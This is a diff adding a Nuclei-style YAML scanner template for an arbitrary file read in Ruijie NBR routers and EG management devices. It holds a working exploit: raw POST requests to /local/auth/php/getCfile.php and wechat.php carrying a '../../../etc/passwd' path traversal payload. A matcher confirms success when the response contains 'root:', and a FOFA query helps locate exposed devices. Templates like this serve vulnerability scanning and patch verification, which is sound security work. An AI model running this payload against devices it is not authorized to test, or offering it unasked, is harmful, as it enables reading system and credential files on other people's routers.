@@ -1,0 +1,42 @@
+http:
+    - attack: pitchfork
+      matchers:
+        - dsl:
+            - status_code_1 == 200 && contains((body_1), 'root:')
+          type: dsl
+      payloads:
+        body:
+            - cf=../../../etc/passwd
+            - cf=../../../etc/passwd&usermac=&ip=&mobile=
+        path:
+            - getCfile.php
+            - wechat.php
+      raw:
+        - |
+          POST /local/auth/php/{{path}} HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Moziilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+          Content-Type: application/x-www-form-urlencoded
+          Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+          Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+          Accept-Encoding: gzip, deflate
+          DNT: 1
+          Connection: close
+
+          {{body}}
+      stop-at-first-match: true
+id: ruijie-eg-and-nbr-local-auth-php-fileread
+info:
+    author: xy
+    description: 锐捷NBR路由器、锐捷EG易网管/local/auth/php 任意文件读取
+    metadata:
+        fofa-query: fid="BcZWN696xewWLAncU/0IiA=="
+        max-request: 1
+        veified: true
+    name: 锐捷NBR路由器、锐捷EG易网管/local/auth/php 任意文件读取
+    reference:
+        - https://github.com/sunyixuan1228/cve/blob/47e8bb342eda3c402d162bc58e1badbcae533e8e/RuiJie-EG.md
+    severity: medium
+    tags:
+        - ruijie
+        - fileread
